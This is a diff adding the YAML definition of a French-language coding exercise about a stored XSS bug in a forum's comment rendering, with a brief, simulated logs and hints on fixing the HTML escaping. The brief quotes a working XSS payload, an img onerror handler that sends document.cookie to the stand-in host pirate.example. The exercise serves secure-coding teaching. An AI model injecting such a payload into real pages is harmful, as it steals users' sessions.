@@ -1,0 +1,33 @@
+id: securite-01
+title: Le commentaire qui vole les sessions
+order: 1
+type: bug-hunt
+runtime: node
+difficulty: 2
+xp: 80
+blackout: false
+hintCost: 10
+bugType: xss
+entry: commentaires.js
+lessons: [securite-02]
+brief: |
+  Hier soir, plusieurs membres du forum de l'atelier ont été déconnectés, puis leurs comptes ont
+  publié des messages publicitaires. L'équipe a trouvé ce commentaire, posté juste avant :
+
+  ```html
+  <img src="x" onerror="fetch('https://pirate.example/?c=' + document.cookie)">
+  ```
+
+  `carteCommentaire({ auteur, texte })` produit le HTML d'un commentaire, et `echapperHTML(texte)`
+  doit rendre n'importe quel texte inoffensif. Corrige-les : tout ce qui vient d'un utilisateur
+  doit s'afficher **tel quel**, comme du texte, y compris dans les attributs.
+logs: |
+  [forum] commentaire #8812 auteur="visiteur" texte="<img src=\"x\" onerror=…>"
+  [auth]  session de ada réutilisée depuis 185.x.x.x (pays inhabituel)
+  [auth]  session de bob réutilisée depuis 185.x.x.x
+  [forum] signalement : « mon pseudo Tom & Jerry s'affiche Tom &amp;amp; Jerry »
+hints:
+  - "Repère chaque endroit où une donnée de l'utilisateur entre dans le HTML. Sont-ils tous échappés ?"
+  - "Dans quel ordre echapperHTML remplace-t-il les caractères ? Essaie-la sur « Tom & Jerry » et sur « < »."
+  - "Il faut aussi échapper \" et ', sinon un auteur peut fermer l'attribut data-auteur et en ajouter un autre. Et String(texte) pour accepter les nombres."
+tests: tests/
